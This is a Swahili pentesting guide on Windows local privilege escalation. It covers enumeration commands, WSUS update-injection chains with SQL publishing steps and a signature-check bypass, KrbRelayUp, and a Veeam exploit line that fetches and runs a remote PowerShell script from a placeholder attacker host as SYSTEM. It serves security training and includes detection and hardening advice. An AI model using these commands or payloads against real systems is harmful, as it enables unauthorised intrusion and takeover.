# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora ya kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ukurasa huu unakusanya mbinu za jumla za Windows privilege escalation kutoka kwenye miongozo kadhaa ya msingi.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Mtiririko wake wa vitendo wa enumeration pia unatokana na warsha na orodha za ukaguzi za jumuiya.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Maudhui ya kihistoria kuhusu mashambulizi yanajumuisha wasilisho la DerbyCon kuhusu Windows privilege escalation.<sup>[[5]](#references)</sup>

## Nadharia ya Awali ya Windows

### Access Tokens

**Ikiwa hujui access tokens za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Tazama ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa hujui integrity levels ni nini katika Windows, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Vidhibiti vya Usalama vya Windows

Kuna vitu tofauti katika Windows vinavyoweza **kukuzuia kufanya enumeration ya mfumo**, kuendesha executables, au hata **kutambua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na kufanya **enumeration** ya **mbinu** hizi zote za **ulinzi** kabla ya kuanza enumeration ya privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Ufikiaji wa kimwili unaweza pia kubadilisha uhariri wa UEFI NVRAM ukiwa offline kuwa mnyororo wa DMA kabla ya boot na urekebishaji wa kumbukumbu ya Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

Michakato ya UIAccess inayoanzishwa kupitia `RAiLaunchAdminProcess` inaweza kutumiwa vibaya kufikia High IL bila maombi ya uthibitisho wakati ukaguzi wa secure-path wa AppInfo unapozungukwa. Tazama mtiririko maalum wa UIAccess/Admin Protection bypass hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Usambazaji wa registry wa ufikivu wa Secure Desktop unaweza kutumiwa vibaya kuandika thamani yoyote kwenye registry ya SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Matoleo ya hivi karibuni ya Windows pia yalianzisha njia ya **SMB arbitrary-port** ya LPE ambapo uthibitishaji wa NTLM wa ndani wenye upendeleo unaakisiwa kupitia muunganisho wa SMB TCP uliotumika tena:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Taarifa za Mfumo

Kwa inventory ya ndani kutoka kwenye kikao kilichopo cha PowerShell, tazama [Windows Enumeration with .NET](../basic-powershell-for-pentesters/dotnet-enumeration.md). Mifano hii inakamilisha ukaguzi ulio hapa chini bila kuanzisha executables tofauti za enumeration.

### Enumeration ya taarifa za toleo

Angalia ikiwa toleo la Windows lina vulnerability yoyote inayojulikana (pia kagua patches zilizotumika).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits za Toleo

[Site](https://msrc.microsoft.com/update-guide/vulnerability) hii ni muhimu kwa kutafuta maelezo ya kina kuhusu udhaifu wa usalama wa Microsoft. Hifadhidata hii ina zaidi ya udhaifu 4,700 wa usalama, ikionyesha **eneo kubwa la mashambulizi** linaloletwa na mazingira ya Windows.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson iliyojumuishwa)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — hukusanya taarifa kuhusu build ya OS, masasisho yaliyosakinishwa na wagombeaji wa advisory waliochaguliwa; thibitisha bidhaa husika na masasisho yaliyotangulia kabla ya kuchukulia matokeo kuwa yanahusika.

Kwa exploit ya ndani inayohusu toleo mahususi, kagua **usanifu wa mchakato unaoendesha** pamoja na usanifu wa OS. Kwenye Windows ya biti 64, mchakato wa biti 32 huathiriwa na [uelekezaji upya wa mfumo wa faili wa WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` kwa kawaida huelekezwa kwenye saraka ya mfumo ya biti 32, ilhali `%windir%\Sysnative` huupa mchakato huo ufikiaji wa saraka ya mfumo asilia. Jina hilo mbadala halipatikani kwa mchakato wa biti 64. Build ya OS au mgombeaji wa KB inayokosekana haithibitishi kuwa exploit inaweza kutumika; linganisha build inayoendesha, sasisho lililosakinishwa au lililotangulia, usanifu wa mchakato na masharti ya exploit na [taarifa ya usalama ya Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) kuhusu suala husika.

Kwa mfano wa uharibifu wa kumbukumbu ya huduma, angalia [offset za ring ya kumbukumbu ya pamoja za MIDI zinazodhibitiwa na client](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Offset za stack zilizochapishwa zinatumika tu kwa build iliyojaribiwa; kupata `LOCAL SERVICE` ni hatua tofauti na hatua inayofuata ya [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) ya kupata `SYSTEM`.<sup>[[44]](#references)</sup>

**Ndani ya mfumo kwa kutumia taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repos za exploits kwenye Github:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Kuna taarifa zozote za credential/Juicy zilizohifadhiwa kwenye env variables?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia ya PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

Profaili ya [PowerShell](../basic-powershell-for-pentesters/#powershell-profile-startup-injection) inayoweza kuandikwa ni njia tofauti ya utekelezaji wakati wa kuanzisha mfumo; hakikisha kuwa mtumiaji mwenye ruhusa za juu zaidi anapakia profaili hiyo kabla ya kuichukulia kama njia ya kupata ruhusa za juu.

### Faili za rekodi za PowerShell

Unaweza kujifunza jinsi ya kuwezesha kipengele hiki hapa: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ni mfano tu. [Sera ya unukuzi ya PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) kwa kawaida huhifadhi faili kwenye folda ya Documents ya kila mtumiaji, lakini mipangilio ya `OutputDirectory` au `Start-Transcript -OutputDirectory` inaweza kuelekeza faili kwenye folda inayoshirikiwa au iliyofichwa. Hakiki njia halisi ya kuhifadhi na ACL ya faili kabla ya kukagua nakala: huenda ikawa na hoja za amri na matokeo, yakiwemo vitambulisho vya kuingia. Nakala inayosomeka ni kidokezo tu ikiwa maudhui yake yanafichua utambulisho wa kiwango cha juu unaoweza kutumiwa, na utambulisho huo unaweza kuingia katika muktadha husika.

### PowerShell Module Logging

Maelezo ya utekelezaji wa pipeline ya PowerShell hurekodiwa, yakiwemo amri zilizotekelezwa, miito ya amri na sehemu za scripts. Hata hivyo, huenda maelezo kamili ya utekelezaji na matokeo yasirekodiwe.

Ili kuwasha kipengele hiki, fuata maagizo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Ili kuona matukio 15 ya mwisho kutoka kwenye logs za PowersShell unaweza kutekeleza:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script hunaswa, na kuhakikisha kuwa kila block ya code inaandikwa inapoendeshwa. Mchakato huu huhifadhi rekodi kamili ya ukaguzi ya kila shughuli, ambayo ni muhimu kwa uchunguzi wa kidijitali na kuchanganua tabia hasidi. Kwa kuandika shughuli zote wakati wa utekelezaji, maarifa ya kina kuhusu mchakato huo hutolewa.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Matukio ya logging ya Script Block yanaweza kupatikana kwenye Windows Event Viewer katika njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya hivi karibuni, unaweza kutumia:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Mipangilio ya Intaneti

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Viendeshi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Mwongozo wa awali ulifupisha hatari kama ifuatavyo:

Unaweza kuhatarisha mfumo ikiwa masasisho yanaombwa kupitia http badala ya http**S**.

Endpoint ya WSUS inayotumia HTTP ni kidokezo cha kuchunguza uwezekano wa kuingiliwa kwa metadata ya masasisho. Unyonyaji pia hutegemea kama mteja anatumia seva hiyo ya WSUS, kama mshambuliaji anaweza kuingilia au kudhibiti trafiki yake, na sera za mteja za kuamini na kusakinisha masasisho. URL pekee haithibitishi kuwa utekelezaji wa msimbo unaweza kufanyika. [Microsoft inapendekeza TLS kwa metadata ya WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Anza kwa kuangalia kama mtandao unatumia masasisho ya WSUS yasiyotumia SSL kwa kutekeleza yafuatayo kwenye cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Au yafuatayo katika PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ukipokea jibu kama mojawapo ya haya:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Kauli ya awali kuhusu uwezekano wa kutumia udhaifu ilikuwa:

Kisha, **unaweza kuutumia.** Ikiwa thamani ya mwisho ya registry ni sawa na 0, basi ingizo la WSUS litapuuzwa.

`UseWUServer` ikiwa `1`, Windows Update hutumia huduma ya intranet iliyosanidiwa. Hii inathibitisha sharti la awali la njia ya udukuzi wa HTTP, lakini haithibitishi kwamba udukuzi huo, kukubaliwa kwa update hasidi, au usakinishaji wenye marupurupu ya juu unawezekana. Ikiwa ni `0`, endpoint hii mahususi ya WSUS iliyosanidiwa haichaguliwi na sera hiyo.

Ili kutumia udhaifu huu, unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni scripts za MiTM zilizotayarishwa kwa mashambulizi ili kuingiza updates za 'bandia' kwenye trafiki ya WSUS isiyo ya SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Kimsingi, hili ndilo dosari linalotumiwa na hitilafu hii:

> Ikiwa tuna uwezo wa kurekebisha proxy ya mtumiaji wetu wa ndani, na Windows Updates ikatumia proxy iliyosanidiwa kwenye mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) ndani ya kifaa chetu ili kunasa trafiki yetu wenyewe na kuendesha code kama mtumiaji mwenye marupurupu ya juu kwenye kifaa chetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS hutumia mipangilio ya mtumiaji wa sasa, itatumia pia certificate store yake. Tukitengeneza certificate iliyosainiwa yenyewe kwa hostname ya WSUS na kuongeza certificate hiyo kwenye certificate store ya mtumiaji wa sasa, tutaweza kunasa trafiki ya WSUS ya HTTP na HTTPS. WSUS haina utaratibu unaofanana na HSTS wa kutekeleza uthibitishaji wa trust-on-first-use kwa certificate. Ikiwa certificate iliyowasilishwa inaaminika na mtumiaji na ina hostname sahihi, huduma itaikubali.

Unaweza kutumia udhaifu huu kwa zana [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (ikishatolewa).

### Updates zinazodhibitiwa na msimamizi wa WSUS

Kuna njia tofauti ikiwa utambulisho wa sasa unaweza **kuchapisha na kuidhinisha** updates kwenye seva ya WSUS. Kagua uanachama halisi katika kundi la `WSUS Administrators` la seva pamoja na ruhusa zozote za WSUS zilizokabidhiwa, kisha tambua kundi la kompyuta za wateja litakalopokea update iliyoidhinishwa. [Microsoft inahitaji marupurupu ya WSUS Administrator ili kuidhinisha updates](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), na [inaeleza uhusiano wa uaminifu wa uchapishaji](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): wateja lazima waamini certificate ya kusaini inayotumiwa kwa maudhui yaliyochapishwa ndani ya mfumo. Thibitisha kuwa update inayolengwa imesainiwa na kukubaliwa, inatumika kwa lengo, na imesakinishwa katika muktadha wenye marupurupu ya juu zaidi kabla ya kuchukulia hili kuwa njia ya kuongeza marupurupu. Thamani ya HTTP `WUServer` au jina la kundi pekee havithibitishi masharti hayo.

### Matumizi mabaya ya updates maalum za SUSDB: payloads zisizosainiwa kupitia `.txt`/`.esd`

Hili ni tatizo tofauti la mpaka wa uaminifu na kunasa muunganisho wa HTTP WSUS: sharti la awali ni kuwa na ufikiaji wa kutosha kwa **stored procedures za database ya WSUS (`SUSDB`)** ili kuchapisha na kuidhinisha update maalum. Njia moja ya vitendo ya kuingia ni kupeleka akaunti ya kompyuta ya WSUS ya upstream kupitia relay hadi seva tofauti ya MSSQL inayohifadhi `SUSDB`; sharti halisi hutegemea usanidi husika, kwa hiyo kwanza orodhesha ruhusa za `EXECUTE` badala ya kudhani kuwa haki za msimamizi wa SQL zinahitajika.<sup>[[38]](#references)[[39]](#references)</sup>

Kwa njia tofauti ya mashambulizi inayopitisha uthibitishaji wa mteja wa WSUS kutoka HTTP/8530 kwenda LDAP, SMB, au AD CS, tazama [Kutumia WSUS HTTP vibaya kwa NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Thibitisha relay ya database ya nje na ruhusa za procedure

Katika usanidi ambapo WSUS hutumia SQL Server ya nje, kwanza kagua ikiwa akaunti ya seva ya WSUS inaweza kuthibitishwa kwenye database na ikiwa NTLM relay inafika kwenye msikilizaji huyo. Jukumu la seva la SQL linaweza kuruhusu procedures za kuchapisha updates hata kama uandishi wa moja kwa moja kwenye jedwali umekataliwa; kushindwa kwa `UPDATE` dhidi ya `SUSDB` hakuthibitishi kuwa uchapishaji umezuiwa. Kagua utambulisho halisi, uanachama wa jukumu, na ruhusa za procedure katika session ya SQL iliyoidhinishwa kabla ya kujaribu update maalum.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Ufafanuzi wa taratibu zinazotumika sasa na `SoftwareDistributionPackage.xsd` iliyosakinishwa ni muhimu unaporejesha metadata halali ya update. Parent ya bundle na child ya payload kila moja zinahitaji `UpdateIdentity` (aina ya fragment `1`), `LocalizedProperties` (`4`), na `ExtendedProperties` (`2`); hifadhi local revision ID inayorejeshwa na kila mwito wa `spImportUpdate` na uhakikishe kuwa uhusiano wa bundle, digests, size, content URL na revision vinaendana. Huu ni mtiririko wa uchapishaji unaotegemea hali, kwa hivyo mwito mmoja tu wa stored procedure uliofanikiwa hauthibitishi utekelezaji upande wa client.<sup>[[38]](#references)</sup>

#### Jenga, lenga na uidhinishe update

Mtiririko wa custom-update hutumia taratibu halali za WSUS kama API yenye vikwazo ya uchapishaji. Mabadiliko muhimu ya hali ni:<sup>[[38]](#references)</sup>

| Hatua | Stored procedures husika |
| --- | --- |
| Ingiza metadata ya update | `spImportUpdate` |
| Hifadhi fragment za XML za prerequisites, localized na extended | `spSaveXMLFragment` |
| Husisha digest ya content na URL inayodhibitiwa na mshambuliaji | `spSetBatchURL` |
| Orodhesha/unda computer group na uongeze client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Idhinisha usakinishaji kwa group hiyo | `spDeployUpdate` yenye `@actionID = 0` na `@isAssigned = 1` |

Jina la faili, digests, size na handler ya `CommandLineInstallation` lazima zilingane katika metadata/fragments zilizoingizwa. Baada ya kuweka content URL na target group, idhini ya mwisho hufanana na ifuatayo; tumia vitambulishi vipya vya update, group na deployment badala ya kutumia tena GUID za mfano.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Bypass ya signature inayotokana na extension

WSUS kwa kawaida hukataa maudhui ya executable yasiyo na signature kiholela. Hata hivyo, katika `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, njia ya .NET `VerifyFile` huweka alama ya ukaguzi wa certificate kuwa false jina la faili lililotolewa linapoishia kwa `.txt` au `.esd`; kisha `CheckCertificateSignature` hurukwa bila kwanza kuthibitisha kwamba bytes ni maandishi au picha halali ya ESD. Kwa hiyo, PE isiyobadilishwa yenye jina kama `payload.exe.txt` inaweza kupita uthibitishaji wa maudhui na baadaye kuendeshwa na handler ya usakinishaji wa command-line ya update. Hii ni hitilafu ya policy/type-confusion, si kughushi signature.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging na automation inayooana na BITS

Kuita `spDeployUpdate` husababisha WSUS kuchukua maudhui yaliyosajiliwa. Origin lazima itimize matarajio ya HTTP ya BITS: URL inayofikika pekee haitoshi kwa sababu uhamishaji hutumia mtiririko wa awali wa `HEAD`/`GET` na maombi ya byte-range. Server isiyoauni Range husababisha WSUS synchronization `EventId=364`, ikisema kwamba BITS inahitaji kichwa cha itifaki ya Range.<sup>[[39]](#references)</sup>

Utafiti wa PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) huzalisha SQL inayohitajika kwa mnyororo wa import/fragment/URL/group/deployment, inajumuisha MSSQL client iliyorekebishwa kwa ajili ya kuitekeleza, na huja na `BitsWebServer.py` kwa ajili ya staging ya maudhui. Amri ndogo ya kutumia kwenye authorized lab ni:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Utekelezaji usiohitaji uingiliaji wa mtumiaji na persistence ya majaribio upya

Mwingiliano wa upande wa client hutegemea policy. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, chaguo la `4 - Auto download and schedule install`, husababisha update iliyoidhinishwa ipakuliwe na kusakinishwa kwa ratiba iliyosanidiwa bila mtumiaji kuichagua mwenyewe. Katika majaribio, payload ambayo update yake ilibaki imeshindwa/haijakamilika ilitolewa tena mara moja baada ya mchakato wa callback kutoka; kwa hiyo, tabia ya kujaribu tena inaweza kuwa persistence ya utekelezaji unaojirudia. Hii huacha alama nyingi kwa sababu client huonyesha hali ya update kushindwa.<sup>[[39]](#references)</sup>

#### Pivots za ugunduzi na hardening

Pivots muhimu za upande wa server na client kutoka kwenye mnyororo huu ni:<sup>[[39]](#references)</sup>

- Kagua utekelezaji wa `spCreateTargetGroup`, `spSetBatchURL` na `spDeployUpdate` kwenye `SUSDB`; chunguza target groups mpya, asili za maudhui za nje, payload za update za `.txt`/`.esd`, na deployments zinazofanywa na principals zisizotarajiwa (hasa akaunti zisizo za kompyuta).
- Kagua `C:\Program Files\Update Services\LogFiles` ili kutafuta `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` (iliyoandikwa vibaya), na `EventId=364`; linganisha uthibitishaji na extension ya payload na maudhui yake halisi badala ya kutegemea kiambishi tamati.
- Tafuta usakinishaji wa Windows Update unaoshindwa/kujaribu tena mara kwa mara, na utekelezaji wa PE au shughuli zisizotarajiwa za michakato-tanzu/mtandao kutoka kwa maudhui yenye majina ya `.txt` au `.esd`.
- Inapoungwa mkono, hitaji Extended Protection for Authentication kwenye huduma ya database, na zuia ufikiaji wa mtandao wa database kwa server ya WSUS na mifumo ya usimamizi iliyoidhinishwa pekee. Punguza na kagua haki za `EXECUTE` kwenye procedures za custom-update.

## Third-Party Auto-Updaters na Agent IPC (local privesc)

Agent nyingi za biashara hutoa uso wa IPC wa localhost na channel ya update yenye privileges za juu. Ikiwa usajili unaweza kulazimishwa kuwasiliana na server ya mshambuliaji na updater inaamini rogue root CA au ukaguzi dhaifu wa signer, mtumiaji wa ndani anaweza kuwasilisha MSI hasidi ambayo service ya SYSTEM husakinisha. Tazama technique ya jumla (inayotegemea mnyororo wa Netskope stAgentSvc – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM kupitia TCP 9401)

Maelezo ya awali yaliyohusu toleo maalum na dokezo la upelelezi yalikuwa:

Veeam B&R < `11.0.1.1261` hutoa service ya localhost kwenye **TCP/9401** inayochakata ujumbe unaodhibitiwa na mshambuliaji, na kuruhusu utekelezaji wa amri kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: thibitisha listener na toleo, kwa mfano, `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication na Cloud Connect hutumia core backup service kwenye **TCP/9401 kwa chaguomsingi**. [Ushauri wa Veeam](https://www.veeam.com/kb4424) unaeleza ufichuaji usiohitaji uthibitishaji wa credentials za database ya usanidi zilizosimbwa kwa njia fiche, ndani ya mpaka wa mtandao wa backup; PoC tofauti ya umma inaonyesha njia ya kutekeleza amri kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Service inaweza kufungamana na anwani nyingine zaidi ya localhost, kwa hiyo kagua anwani yake halisi na PID.

- **Recon**: thibitisha kuwa TCP/9401 inamilikiwa na `Veeam.Backup.Service.exe`, kisha kagua bidhaa iliyosakinishwa na metadata ya patch. `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ni vidokezo, si ukaguzi kamili wa patch.
- **Matoleo ya kwanza yaliyorekebishwa**: Veeam inaorodhesha **11a build 11.0.1.1261 P20230227** na **12 build 12.0.0.1420 P20230223** kama matoleo ya kwanza yaliyorekebishwa; matoleo ya awali yameathirika. File version yenye sehemu nne pekee haiwezi kutofautisha base build isiyowekewa patch na patch ya baadaye kwenye build number hizo hizo. Thibitisha kitambulisho cha patch kwenye [historia ya build ya vendor](https://www.veeam.com/kb2680) kabla ya kusema kuwa boundary build imerekebishwa.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na Veeam DLLs zinazohitajika kwenye directory moja, kisha anzisha payload ya SYSTEM kupitia socket ya ndani:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Huduma hutekeleza amri kama SYSTEM.

PoC iliyotajwa inaonyesha utekelezaji wa amri kama SYSTEM iwapo mahitaji yake ya ziada yametimizwa; ushauri wa vendor unaeleza suala la kufichuliwa kwa vitambulisho.

## KrbRelayUp

Maelezo ya awali kuhusu mazingira chaguomsingi yalikuwa:

Kuna udhaifu wa **local privilege escalation** katika mazingira ya Windows **domain** chini ya masharti mahususi. Masharti haya yanajumuisha mazingira ambapo **LDAP signing haijalazimishwa,** watumiaji wana self-rights zinazowaruhusu kusanidi **Resource-Based Constrained Delegation (RBCD),** na watumiaji wana uwezo wa kuunda kompyuta ndani ya domain. Ni muhimu kutambua kwamba **mahitaji** haya hutimizwa kwa kutumia **mipangilio chaguomsingi**.

Relay ya Kerberos ya ndani inaweza kutoka kwenye logon yenye ruhusa ndogo hadi kwenye uandishi wa directory wenye ruhusa za juu pale COM server inayofaa inapothibitisha utambulisho na principal iliyorerelayiwa ikiwa na ruhusa kwenye object lengwa. [Nyaraka za KrbRelay](https://github.com/cube0x0/KrbRelay) zinaeleza uandishi wa LDAP wa RBCD na `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp huendesha kiotomatiki baadhi ya njia hizi. Mnyororo wa RBCD unahitaji ruhusa zinazofaa za delegation na za object lengwa, huku mnyororo wa shadow-credential ukihitaji ruhusa za kuandika key-credential na KDC inayotumia njia ya uthibitishaji wa certificate. Hakuna njia kati ya hizi inayotokana na uanachama wa domain pekee.

